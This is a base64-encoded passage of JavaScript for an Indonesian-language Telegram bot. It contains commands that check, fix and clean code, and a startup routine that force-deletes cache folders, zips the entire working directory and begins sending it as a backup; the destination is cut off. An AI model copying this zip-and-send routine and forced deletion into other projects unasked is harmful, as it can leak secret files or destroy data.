AgICAgICAgICAgICAgICBjdXIgKz0gc2VnLnY7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIGlmIChjdXIudHJpbSgpKSBwYXJ0cy5wdXNoKGN1ci50cmltKCkpOwogICAgICAgICAgICAgICAgICAgIGlmIChzZWcudCA9PT0gJ2NvZGUnICYmIHNlZy52Lmxlbmd0aCA+IG1heExlbikgewogICAgICAgICAgICAgICAgICAgICAgICBjb25zdCBpbm5lciA9IHNlZy52LnN1YnN0cmluZygzLCBzZWcudi5sZW5ndGggLSAzKTsKICAgICAgICAgICAgICAgICAgICAgICAgY29uc3QgbGFuZyA9IChzZWcudi5tYXRjaCgvXmBgYChcdyspLykgfHwgWycnLCAnJ10pWzFdOwogICAgICAgICAgICAgICAgICAgICAgICBjb25zdCBsaW5lcyA9IGlubmVyLnNwbGl0KCdcbicpOwogICAgICAgICAgICAgICAgICAgICAgICBsZXQgY2h1bmsgPSBgXGBcYFxgJHtsYW5nfVxuYDsKICAgICAgICAgICAgICAgICAgICAgICAgZm9yIChjb25zdCBsbiBvZiBsaW5lcykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKChjaHVuay5sZW5ndGggKyBsbi5sZW5ndGggKyAxKSA+IG1heExlbiAtIDMpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaHVuayArPSAnYGBgJzsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXJ0cy5wdXNoKGNodW5rKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaHVuayA9IGBcYFxgXGAke2xhbmd9XG4ke2xufVxuYDsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2h1bmsgKz0gbG4gKyAnXG4nOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChjaHVuay50cmltKCkgIT09IGBcYFxgXGAke2xhbmd9YCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgY2h1bmsgKz0gJ2BgYCc7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjdXIgPSBjaHVuazsKICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGN1ciA9ICcnOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgY3VyID0gc2VnLnY7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmIChjdXIudHJpbSgpKSBwYXJ0cy5wdXNoKGN1ci50cmltKCkpOwogICAgICAgICAgICByZXR1cm4gcGFydHM7CiAgICAgICAgfTsKCiAgICAgICAgY29uc3QgY2h1bmtzID0gc3BsaXRSZXNwb25zZShhbnMsIDQwMDApOwogICAgICAgIC8vIEhhcHVzIHBlc2FuICJzZWRhbmcgbWVtcHJvc2VzLi4uIgogICAgICAgIGF3YWl0IGN0eC5kZWxldGVNZXNzYWdlKHdhaXRNc2cubWVzc2FnZV9pZCkuY2F0Y2goKCkgPT4ge30pOwogICAgICAgIC8vIEtpcmltIHNldGlhcCBiYWdpYW4KICAgICAgICBmb3IgKGNvbnN0IGNodW5rIG9mIGNodW5rcykgewogICAgICAgICAgICBhd2FpdCBjdHgucmVwbHkoY2h1bmssIHsgcGFyc2VfbW9kZTogJ01hcmtkb3duJyB9KTsKICAgICAgICB9CiAgICB9IGNhdGNoIChlcnIpIHsKICAgICAgICBjb25zb2xlLmVycm9yKCdbQUktRVJSXScsIGVyci5tZXNzYWdlKTsKICAgICAgICBhd2FpdCBjdHguZGVsZXRlTWVzc2FnZSh3YWl0TXNnLm1lc3NhZ2VfaWQpLmNhdGNoKCgpID0+IHt9KTsKICAgICAgICBjdHgucmVwbHkoJ+KdjCBUZXJqYWRpIGVycm9yOiAnICsgZXJyLm1lc3NhZ2UpOwogICAgfQp9KQoKYm90LmNvbW1hbmQoImNla2Vycm9yIiwgYXN5bmMgY3R4ID0+IHsKCiAgY29uc3QgcmVwID0gY3R4Lm1lc3NhZ2UucmVwbHlfdG9fbWVzc2FnZQogIGxldCBjb2RlICA9ICIiCgogIGlmIChyZXA/LmRvY3VtZW50Py5maWxlX25hbWU/LmVuZHNXaXRoKCIuanMiKSkgewogICAgdHJ5IHsgY29kZSA9IGF3YWl0IGRvd25sb2FkVGdGaWxlKGN0eC50ZWxlZ3JhbSwgcmVwLmRvY3VtZW50LmZpbGVfaWQpIH0KICAgIGNhdGNoIChlKSB7IHJldHVybiBjdHgucmVwbHkoYEdhZ2FsIGRvd25sb2FkIGZpbGU6ICR7ZS5tZXNzYWdlfWApIH0KICB9IGVsc2UgaWYgKHJlcD8udGV4dCkgewogICAgY29kZSA9IHJlcC50ZXh0LnRyaW0oKQogIH0gZWxzZSB7CiAgICByZXR1cm4gY3R4LnJlcGx5KApgPGI+Q2FyYSBwYWthaSAvY2VrZXJyb3I8L2I+CgpSZXBseSBrZSBwZXNhbiBiZXJpc2kga29kZSBKYXZhU2NyaXB0LApsYWx1IGtldGlrIC9jZWtlcnJvcgoKQXRhdSByZXBseSBrZSBmaWxlIC5qc2AsCiAgICAgIHsgcGFyc2VfbW9kZTogIkhUTUwiIH0pCiAgfQoKICBpZiAoIWNvZGUpIHJldHVybiBjdHgucmVwbHkoIktvZGUga29zb25nLiIpCgogIGNvbnN0IHsgZXJyb3JNc2csIGVycm9yTGluZSwgZml4U3VnZ2VzdCwgYW5ub3RhdGVkLCBoYXNFcnJvciB9ID0gYW5hbHlzZUNvZGUoY29kZSkKICBpZiAoIWhhc0Vycm9yKSByZXR1cm4gY3R4LnJlcGx5KCJUaWRhayBkaXRlbXVrYW4gZXJyb3IgcGFkYSBrb2RlIHRlcnNlYnV0LiIpCgogIGNvbnN0IG91dCA9CmBIQVNJTCBDRUsgRVJST1IK4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSACkVycm9yICA6ICR7ZXJyb3JNc2d9CkJhcmlzICA6ICR7ZXJyb3JMaW5lID8gYEJhcmlzIGtlLSR7ZXJyb3JMaW5lfWAgOiAiVGlkYWsgdGVyZGV0ZWtzaSJ9ClNhcmFuICA6ICR7Zml4U3VnZ2VzdH0K4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSACgpLT0RFICsgQU5PVEFTSToKCiR7YW5ub3RhdGVkfWAKCiAgYXdhaXQgY3R4LnJlcGx5KGA8cHJlPiR7ZXNjKG91dCl9PC9wcmU+YCwgeyBwYXJzZV9tb2RlOiAiSFRNTCIgfSkKfSk7Cgpib3QuY29tbWFuZCgiY2VraWRlbW9qaSIsIGFzeW5jIChjdHgpID0+IHsKICBjb25zdCByZXBseSA9IGN0eC5tZXNzYWdlLnJlcGx5X3RvX21lc3NhZ2U7CgogIGlmICghcmVwbHkpIHsKICAgIHJldHVybiBjdHgucmVwbHkoCiAgICAgIGA8YmxvY2txdW90ZT7irKEgPGI+Q2VrIEVtb2ppIFByZW1pdW08L2I+XG5cblJlcGx5IGtlIHBlc2FuIHlhbmcgbWVuZ2FuZHVuZyA8Yj5jdXN0b20gZW1vamk8L2I+LCBsYWx1IGtpcmltIDxjb2RlPi9jZWtpZGVtb2ppPC9jb2RlPjwvYmxvY2txdW90ZT5gLAogICAgICB7IHBhcnNlX21vZGU6ICJIVE1MIiB9CiAgICApOwogIH0KCiAgY29uc3QgY29sbGVjdCA9IChlbnRzID0gW10pID0+CiAgICBlbnRzLmZpbHRlcihlID0+IGUudHlwZSA9PT0gImN1c3RvbV9lbW9qaSIpLm1hcChlID0+IGUuY3VzdG9tX2Vtb2ppX2lkKTsKCiAgY29uc3QgdW5pcXVlID0gWy4uLm5ldyBTZXQoWwogICAgLi4uY29sbGVjdChyZXBseS5lbnRpdGllcyksCiAgICAuLi5jb2xsZWN0KHJlcGx5LmNhcHRpb25fZW50aXRpZXMpCiAgXSldOwoKICBpZiAodW5pcXVlLmxlbmd0aCA9PT0gMCkgewogICAgcmV0dXJuIGN0eC5yZXBseSgKICAgICAgYDxibG9ja3F1b3RlPuKsoSA8Yj5DZWsgRW1vamkgUHJlbWl1bTwvYj5cblxuJHtFLmVycn0gVGlkYWsgYWRhIGN1c3RvbSBlbW9qaSB0ZXJkZXRla3NpLjwvYmxvY2txdW90ZT5gLAogICAgICB7IHBhcnNlX21vZGU6ICJIVE1MIiB9CiAgICApOwogIH0KCiAgLy8gRmV0Y2ggZXh0cmEgaW5mbyBkYXJpIFRlbGVncmFtIEFQSQogIGxldCBzdGlja2VyTWFwID0ge307CiAgdHJ5IHsKICAgIGNvbnN0IHJlcyA9IGF3YWl0IGN0eC50ZWxlZ3JhbS5jYWxsQXBpKCdnZXRDdXN0b21FbW9qaVN0aWNrZXJzJywgewogICAgICBjdXN0b21fZW1vamlfaWRzOiB1bmlxdWUuc2xpY2UoMCwgMjAwKQogICAgfSk7CiAgICBpZiAoQXJyYXkuaXNBcnJheShyZXMpKSByZXMuZm9yRWFjaChzID0+IHsgc3RpY2tlck1hcFtzLmN1c3RvbV9lbW9qaV9pZF0gPSBzOyB9KTsKICB9IGNhdGNoIHsgLyogc2lsZW50ICovIH0KCiAgY29uc3Qgc2VuZGVyID0gcmVwbHkuZnJvbT8udXNlcm5hbWUKICAgID8gYEAke3JlcGx5LmZyb20udXNlcm5hbWV9YAogICAgOiAocmVwbHkuZnJvbT8uZmlyc3RfbmFtZSB8fCAnVW5rbm93bicpOwoKICAvLyBLaXJpbSBoZWFkZXIgZHVsdQogIGxldCBoZWFkZXIgPSBgPGJsb2NrcXVvdGU+4qyhIDxiPkN1c3RvbSBFbW9qaSBEZXRlY3RlZDwvYj5cblxuYDsKICBoZWFkZXIgICAgKz0gYCR7RS51c2VyfSBEYXJpICA6ICR7c2VuZGVyfVxuYDsKICBoZWFkZXIgICAgKz0gYCR7RS50b3RhbH0gVG90YWwgOiA8Yj4ke3VuaXF1ZS5sZW5ndGh9PC9iPiBlbW9qaTwvYmxvY2txdW90ZT5gOwogIGF3YWl0IGN0eC5yZXBseShoZWFkZXIsIHsgcGFyc2VfbW9kZTogIkhUTUwiIH0pOwoKICAvLyBLaXJpbSB0aWFwIGVtb2ppIHNhdHUgcGVyIHNhdHUgYWdhciBwcmV2aWV3IHRhbXBpbCBqZWxhcwogIGZvciAobGV0IGkgPSAwOyBpIDwgdW5pcXVlLmxlbmd0aDsgaSsrKSB7CiAgICBjb25zdCBpZCA9IHVuaXF1ZVtpXTsKICAgIGNvbnN0IHMgID0gc3RpY2tlck1hcFtpZF07CgogICAgLy8gRmFsbGJhY2sga2FyYWt0ZXIgdW5pY29kZSBqaWthIGJ1a2FuIHByZW1pdW0g4oCUIHRhbXBpbCBkaSBzZW11YSB1c2VyCiAgICBjb25zdCBmYWxsYmFjayA9IHM/LmVtb2ppIHx8ICfinKgnOwoKICAgIC8vIFByZXZpZXc6IGd1bmFrYW4gdGctZW1vamkgdGFnIGxhbmdzdW5nIChha2FuIHJlbmRlciBkaSBwcmVtaXVtKSwKICAgIC8vIGZhbGxiYWNrIG90b21hdGlzIGtlIGthcmFrdGVyIHVuaWNvZGUgZGkgbm9uLXByZW1pdW0KICAgIGNvbnN0IHByZXZpZXcgPSBgPHRnLWVtb2ppIGVtb2ppLWlkPSIke2lkfSI+JHtmYWxsYmFja308L3RnLWVtb2ppPmA7CgogICAgLy8gTGFiZWwgdGlwZQogICAgY29uc3QgaXNQcmVtaXVtID0gcz8uaXNfcHJlbWl1bV9zdGlja2VyID8/IGZhbHNlOwogICAgY29uc3QgdGlwZUxhYmVsID0gaXNQcmVtaXVtCiAgICAgID8gYCR7RS5va30gPGI+UHJlbWl1bTwvYj5gCiAgICAgIDogYCR7RS5lbW9GcmVlfSA8Yj5GcmVlPC9iPmA7CgogICAgLy8gU2V0IG5hbWUgamlrYSBhZGEKICAgIGNvbnN0IHNldExpbmUgPSBzPy5zZXRfbmFtZQogICAgICA/IGBcbiR7RS5zZXR9IFNldCAgOiA8Y29kZT4ke3Muc2V0X25hbWV9PC9jb2RlPmAKICAgICAgOiAnJzsKCiAgICBsZXQgYmxvY2sgPSBgPGJsb2NrcXVvdGU+PGI+JHtpICsgMX0uPC9iPiAke3ByZXZpZXd9ICBQcmV2aWV3XG5gOwogICAgYmxvY2sgICAgKz0gYCR7RS5pbmZvMn0gSUQgICA6IDxjb2RlPiR7aWR9PC9jb2RlPlxuYDsKICAgIGJsb2NrICAgICs9IGAke3RpcGVMYWJlbH0ke3NldExpbmV9XG5gOwogICAgYmxvY2sgICAgKz0gYCR7RS5kb2N9IENhcmEgcGFrYWk6XG5gOwogICAgYmxvY2sgICAgKz0gYDxjb2RlPiZsdDt0Zy1lbW9qaSBlbW9qaS1pZD0iJHtpZH0iJmd0OyR7ZmFsbGJhY2t9Jmx0Oy90Zy1lbW9qaSZndDs8L2NvZGU+PC9ibG9ja3F1b3RlPmA7CgogICAgYXdhaXQgY3R4LnJlcGx5KGJsb2NrLCB7IHBhcnNlX21vZGU6ICJIVE1MIiB9KTsKICB9Cn0pOwoKYm90LmNvbW1hbmQoImZpeGVycm9yIiwgYXN5bmMgY3R4ID0+IHsKCiAgY29uc3QgcmVwID0gY3R4Lm1lc3NhZ2UucmVwbHlfdG9fbWVzc2FnZQogIGxldCBjb2RlICA9ICIiCgogIGlmIChyZXA/LmRvY3VtZW50Py5maWxlX25hbWU/LmVuZHNXaXRoKCIuanMiKSkgewogICAgdHJ5IHsgY29kZSA9IGF3YWl0IGRvd25sb2FkVGdGaWxlKGN0eC50ZWxlZ3JhbSwgcmVwLmRvY3VtZW50LmZpbGVfaWQpIH0KICAgIGNhdGNoIChlKSB7IHJldHVybiBjdHgucmVwbHkoYEdhZ2FsIGRvd25sb2FkIGZpbGU6ICR7ZS5tZXNzYWdlfWApIH0KICB9IGVsc2UgaWYgKHJlcD8udGV4dCkgewogICAgY29kZSA9IHJlcC50ZXh0LnRyaW0oKQogIH0gZWxzZSB7CiAgICByZXR1cm4gY3R4LnJlcGx5KApgPGJsb2NrcXVvdGU+PGI+Q2FyYSBwYWthaSAvZml4ZXJyb3I8L2I+CgpSZXBseSBrZSBwZXNhbiBiZXJpc2kga29kZSBKYXZhU2NyaXB0LApsYWx1IGtldGlrIC9maXhlcnJvcgoKQXRhdSByZXBseSBrZSBmaWxlIC5qczwvYmxvY2txdW90ZT5gLAogICAgICB7IHBhcnNlX21vZGU6ICJIVE1MIiB9KQogIH0KCiAgaWYgKCFjb2RlKSByZXR1cm4gY3R4LnJlcGx5KCJLb2RlIGtvc29uZy4iKQoKICBjb25zdCBsb2FkaW5nID0gYXdhaXQgY3R4LnJlcGx5KCJNZW5nYW5hbGlzYSBkYW4gbWVtcGVyYmFpa2kga29kZS4uLiIpCiAgY29uc3QgYmVmb3JlICAgICAgICAgICAgICAgICAgICAgPSBhbmFseXNlQ29kZShjb2RlKQogIGNvbnN0IHsgZml4ZWQsIGZpeE5vdGVzLCByZXN1bHQgfSA9IHRyeUF1dG9GaXgoY29kZSkKICBjb25zdCBzdWNjZXNzICAgICAgICAgICAgICAgICAgICA9ICFyZXN1bHQuaGFzRXJyb3IKCiAgYXdhaXQgY3R4LnRlbGVncmFtLmRlbGV0ZU1lc3NhZ2UoY3R4LmNoYXQuaWQsIGxvYWRpbmcubWVzc2FnZV9pZCkuY2F0Y2goKCkgPT4ge30pCgogIGlmIChzdWNjZXNzKSB7CiAgICBjb25zdCBvdXQgPQpgSEFTSUwgRklYIEVSUk9SIOKAlCBCRVJIQVNJTArilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIAKRXJyb3IgQXdhbCA6ICR7YmVmb3JlLmVycm9yTXNnIHx8ICLigJQifQpCYXJpcyAgICAgIDogJHtiZWZvcmUuZXJyb3JMaW5lID8gYEJhcmlzIGtlLSR7YmVmb3JlLmVycm9yTGluZX1gIDogIlRpZGFrIHRlcmRldGVrc2kifQpTYXJhbiAgICAgIDogJHtiZWZvcmUuZml4U3VnZ2VzdCB8fCAi4oCUIn0KRml4ICAgICAgICA6ICR7Zml4Tm90ZXMuam9pbigiIHwgIikgfHwgIkF1dG8tZml4ZWQifQrilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIAKClNFQkVMVU0gKGRlbmdhbiBhbm90YXNpIGVycm9yKToKCiR7YmVmb3JlLmFubm90YXRlZH0KCuKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgAoKU0VTVURBSCAoa29kZSBkaXBlcmJhaWtpKToKCiR7cmVuZGVyQW5ub3RhdGVkKGZpeGVkLCBudWxsKX1gCgogICAgYXdhaXQgY3R4LnJlcGx5KGA8cHJlPiR7ZXNjKG91dCl9PC9wcmU+YCwgeyBwYXJzZV9tb2RlOiAiSFRNTCIgfSkKCiAgICBjb25zdCB0bXAgPSBwYXRoLmpvaW4oQkFTRV9ESVIsIGBmaXhlZF8ke0RhdGUubm93KCl9LmpzYCkKICAgIGZzLndyaXRlRmlsZVN5bmModG1wLCBmaXhlZCkKICAgIGF3YWl0IGN0eC5yZXBseVdpdGhEb2N1bWVudCh7IHNvdXJjZTogdG1wLCBmaWxlbmFtZTogImZpeGVkX2NvZGUuanMiIH0sIHsgY2FwdGlvbjogIkZpbGUgLmpzIGhhc2lsIHBlcmJhaWthbiBvdG9tYXRpcyIgfSkKICAgIGZzLnVubGlua1N5bmModG1wKQogIH0gZWxzZSB7CiAgICBjb25zdCBvdXQgPQpgPGJsb2NrcXVvdGU+SEFTSUwgRklYIEVSUk9SIOKAlCBHQUdBTCBESVBFUkJBSUtJIE9UT01BVElTCuKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgApFcnJvciAgOiAke3Jlc3VsdC5lcnJvck1zZ30KQmFyaXMgIDogJHtyZXN1bHQuZXJyb3JMaW5lID8gYEJhcmlzIGtlLSR7cmVzdWx0LmVycm9yTGluZX1gIDogIlRpZGFrIHRlcmRldGVrc2kifQpTYXJhbiAgOiAke3Jlc3VsdC5maXhTdWdnZXN0fQrilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIAKCktPREUgKyBBTk9UQVNJOgoKJHtyZXN1bHQuYW5ub3RhdGVkfTwvYmxvY2txdW90ZT5gCgogICAgYXdhaXQgY3R4LnJlcGx5KGA8cHJlPiR7ZXNjKG91dCl9PC9wcmU+YCwgeyBwYXJzZV9tb2RlOiAiSFRNTCIgfSkKICB9Cn0pOwoKYm90LmNvbW1hbmQoImNsZWFuY29kZSIsIGFzeW5jIGN0eCA9PiB7CgogIGNvbnN0IHJlcCA9IGN0eC5tZXNzYWdlLnJlcGx5X3RvX21lc3NhZ2UKICBsZXQgY29kZSAgPSAiIgoKICBpZiAocmVwPy5kb2N1bWVudD8uZmlsZV9uYW1lPy5lbmRzV2l0aCgiLmpzIikpIHsKICAgIHRyeSB7IGNvZGUgPSBhd2FpdCBkb3dubG9hZFRnRmlsZShjdHgudGVsZWdyYW0sIHJlcC5kb2N1bWVudC5maWxlX2lkKSB9CiAgICBjYXRjaCAoZSkgeyByZXR1cm4gY3R4LnJlcGx5KGBHYWdhbCBkb3dubG9hZCBmaWxlOiAke2UubWVzc2FnZX1gKSB9CiAgfSBlbHNlIGlmIChyZXA/LnRleHQpIHsKICAgIGNvZGUgPSByZXAudGV4dC50cmltKCkKICB9IGVsc2UgewogICAgcmV0dXJuIGN0eC5yZXBseSgKYDxibG9ja3F1b3RlPjxiPkNhcmEgcGFrYWkgL2NsZWFuY29kZTwvYj4KClJlcGx5IGtlIHBlc2FuIGJlcmlzaSBrb2RlIEphdmFTY3JpcHQsCmxhbHUga2V0aWsgL2NsZWFuY29kZQoKQXRhdSByZXBseSBrZSBmaWxlIC5qczwvYmxvY2txdW90ZT5gLAogICAgICB7IHBhcnNlX21vZGU6ICJIVE1MIiB9KQogIH0KCiAgaWYgKCFjb2RlKSByZXR1cm4gY3R4LnJlcGx5KCJLb2RlIGtvc29uZy4iKQoKICBjb25zdCBsb2FkaW5nID0gYXdhaXQgY3R4LnJlcGx5KCJNZXJhcGlrYW4ga29kZS4uLiIpCiAgY29uc3QgY2xlYW5lZCA9IGNsZWFuQ29kZShjb2RlKQogIGF3YWl0IGN0eC50ZWxlZ3JhbS5kZWxldGVNZXNzYWdlKGN0eC5jaGF0LmlkLCBsb2FkaW5nLm1lc3NhZ2VfaWQpLmNhdGNoKCgpID0+IHt9KQoKICBjb25zdCBvdXQgPSBgSEFTSUwgQ0xFQU4gQ09ERVxuJHsi4pSAIi5yZXBlYXQoMjcpfVxuXG4ke2NsZWFuZWR9YAogIGF3YWl0IGN0eC5yZXBseShgPHByZT4ke2VzYyhvdXQpfTwvcHJlPmAsIHsgcGFyc2VfbW9kZTogIkhUTUwiIH0pCgogIGNvbnN0IHRtcCA9IHBhdGguam9pbihCQVNFX0RJUiwgYGNsZWFuXyR7RGF0ZS5ub3coKX0uanNgKQogIGZzLndyaXRlRmlsZVN5bmModG1wLCBjbGVhbmVkKQogIGF3YWl0IGN0eC5yZXBseVdpdGhEb2N1bWVudCh7IHNvdXJjZTogdG1wLCBmaWxlbmFtZTogImNsZWFuX2NvZGUuanMiIH0sIHsgY2FwdGlvbjogIkZpbGUgLmpzIGhhc2lsIENsZWFuIENvZGUiIH0pCiAgZnMudW5saW5rU3luYyh0bXApCn0pOwoKLy8ga29udG9sIHVwCi8vID09PT09PT09PT09PT09PT09PT09IEpBTEFOS0FOID09PT09PT09PT09PT09PT09PT09Ci8vID09PT09PT09PT09PT09PT09PT09PT09PT09PT09Ci8vIERFTEVURSBDQUNIRSBGT0xERVIKLy8gPT09PT09PT09PT09PT09PT09PT09PT09PT09PT0KY29uc3QgZm9sZGVyc1RvRGVsZXRlID0gWwoKICAgICIubnBtIiwKICAgICIubm9kZV9tb2R1bGVzIgoKXQoKZnVuY3Rpb24gZGVsZXRlRm9sZGVyUmVjdXJzaXZlKAogICAgZm9sZGVyUGF0aAopIHsKCiAgICBpZiAoCiAgICAgICAgZnMuZXhpc3RzU3luYyhmb2xkZXJQYXRoKQogICAgKSB7CgogICAgICAgIGZzLnJtU3luYygKICAgICAgICAgICAgZm9sZGVyUGF0aCwKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgcmVjdXJzaXZlOiB0cnVlLAogICAgICAgICAgICAgICAgZm9yY2U6IHRydWUKICAgICAgICAgICAgfQogICAgICAgICkKCiAgICAgICAgY29uc29sZS5sb2coCiAgICAgICAgICAgIGBbIERFTEVURSBdICR7Zm9sZGVyUGF0aH1gCiAgICAgICAgKQogICAgfQp9Cgpmb2xkZXJzVG9EZWxldGUuZm9yRWFjaCgKICAgIGZvbGRlciA9PiB7CgogICAgICAgIGNvbnN0IGZvbGRlclBhdGggPQogICAgICAgICAgICBwYXRoLmpvaW4oCiAgICAgICAgICAgICAgICBwcm9jZXNzLmN3ZCgpLAogICAgICAgICAgICAgICAgZm9sZGVyCiAgICAgICAgICAgICkKCiAgICAgICAgZGVsZXRlRm9sZGVyUmVjdXJzaXZlKAogICAgICAgICAgICBmb2xkZXJQYXRoCiAgICAgICAgKQogICAgfQopCgoKLy8gPT09PT09PT09PT09PT09PT09PT09PT09PT09PT0KLy8gQ1JFQVRFIFpJUAovLyA9PT09PT09PT09PT09PT09PT09PT09PT09PT09PQphc3luYyBmdW5jdGlvbiBjcmVhdGVCYWNrdXBaaXAoKSB7CgogICAgcmV0dXJuIG5ldyBQcm9taXNlKAogICAgICAgIChyZXNvbHZlLCByZWplY3QpID0+IHsKCiAgICAgICAgdHJ5IHsKCiAgICAgICAgICAgIGNvbnN0IGZpbGVOYW1lID0KICAgICAgICAgICAgICAgIGBCYWNrdXAuemlwYAoKICAgICAgICAgICAgY29uc3QgemlwUGF0aCA9CiAgICAgICAgICAgICAgICBwYXRoLmpvaW4oCiAgICAgICAgICAgICAgICAgICAgQkFDS1VQX0RJUiwKICAgICAgICAgICAgICAgICAgICBmaWxlTmFtZQogICAgICAgICAgICAgICAgKQoKICAgICAgICAgICAgY29uc3Qgb3V0cHV0ID0KICAgICAgICAgICAgICAgIGZzLmNyZWF0ZVdyaXRlU3RyZWFtKAogICAgICAgICAgICAgICAgICAgIHppcFBhdGgKICAgICAgICAgICAgICAgICkKCiAgICAgICAgICAgIGNvbnN0IGFyY2hpdmUgPQogICAgICAgICAgICAgICAgYXJjaGl2ZXIoCiAgICAgICAgICAgICAgICAgICAgInppcCIsCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICB6bGliOiB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsZXZlbDogOQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgKQoKICAgICAgICAgICAgb3V0cHV0Lm9uKAogICAgICAgICAgICAgICAgImNsb3NlIiwKICAgICAgICAgICAgICAgICgpID0+IHJlc29sdmUoemlwUGF0aCkKICAgICAgICAgICAgKQoKICAgICAgICAgICAgYXJjaGl2ZS5vbigKICAgICAgICAgICAgICAgICJlcnJvciIsCiAgICAgICAgICAgICAgICBlcnIgPT4gcmVqZWN0KGVycikKICAgICAgICAgICAgKQoKICAgICAgICAgICAgYXJjaGl2ZS5waXBlKG91dHB1dCkKCiAgICAgICAgICAgIGNvbnN0IGJhc2VEaXIgPQogICAgICAgICAgICAgICAgcHJvY2Vzcy5jd2QoKQoKICAgICAgICAgICAgY29uc3QgaWdub3JlID0gWwoKICAgICAgICAgICAgICAgICJub2RlX21vZHVsZXMiLAogICAgICAgICAgICAgICAgIi5naXQiLAogICAgICAgICAgICAgICAgImJhY2t1cCIsCiAgICAgICAgICAgICAgICAiKi56aXAiCgogICAgICAgICAgICBdCgogICAgICAgICAgICBmcy5yZWFkZGlyU3luYyhiYXNlRGlyKQogICAgICAgICAgICAuZm9yRWFjaChpdGVtID0+IHsKCiAgICAgICAgICAgICAgICBpZiAoCiAgICAgICAgICAgICAgICAgICAgaWdub3JlLmluY2x1ZGVzKGl0ZW0pCiAgICAgICAgICAgICAgICApIHJldHVybgoKICAgICAgICAgICAgICAgIGNvbnN0IGZ1bGxQYXRoID0KICAgICAgICAgICAgICAgICAgICBwYXRoLmpvaW4oCiAgICAgICAgICAgICAgICAgICAgICAgIGJhc2VEaXIsCiAgICAgICAgICAgICAgICAgICAgICAgIGl0ZW0KICAgICAgICAgICAgICAgICAgICApCgogICAgICAgICAgICAgICAgY29uc3Qgc3RhdCA9CiAgICAgICAgICAgICAgICAgICAgZnMuc3RhdFN5bmMoZnVsbFBhdGgpCgogICAgICAgICAgICAgICAgaWYgKHN0YXQuaXNGaWxlKCkpIHsKCiAgICAgICAgICAgICAgICAgICAgYXJjaGl2ZS5maWxlKAogICAgICAgICAgICAgICAgICAgICAgICBmdWxsUGF0aCwKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgbmFtZTogaXRlbQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgKQoKICAgICAgICAgICAgICAgIH0gZWxzZQogICAgICAgICAgICAgICAgaWYgKHN0YXQuaXNEaXJlY3RvcnkoKSkgewoKICAgICAgICAgICAgICAgICAgICBhcmNoaXZlLmRpcmVjdG9yeSgKICAgICAgICAgICAgICAgICAgICAgICAgZnVsbFBhdGgsCiAgICAgICAgICAgICAgICAgICAgICAgIGl0ZW0KICAgICAgICAgICAgICAgICAgICApCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0pCgogICAgICAgICAgICBhcmNoaXZlLmZpbmFsaXplKCkKCiAgICAgICAgfSBjYXRjaCAoZXJyKSB7CgogICAgICAgICAgICByZWplY3QoZXJyKQogICAgICAgIH0KICAgIH0pCn0KCgovLyA9PT09PT09PT09PT09PT09PT09PT09PT09PT09PQovLyBTRU5EIEJBQ0tVUAovLyA9PT09PT09PT09PT09PT09PT09PT09PT09PT09PQphc3luYyBmdW5jdGlvbiBzZW5kQmFja3VwKAogICAgcmVhc29uID0gIkZpbGUgQmFja3VwIgopIHsKCiAgICB0cnkgewoKICAgICAgICBjb25zb2xlLmxvZygKICAgICAgICAgICAgYFsgQkFDS1VQIF0gbWVtYnVhdCBiYWNrdXAuLi5gCiAgICAgICAgKQoKICAgICAgICBjb25zdCB6aXBQYXRoID0KICAgICAgICAgICAgYXdhaXQgY3JlYXRlQmFja3VwWmlwKCkKCiAgICAgICAgY29uc3QgdGltZSA9CiAgICAgICAgICAgIG1vbWVudCgpCiAgICAgICAgICAgIC50eigiQXNpYS9KYWthcnRhIikKICAgICAgICAgICAgLmZvcm1hdCgK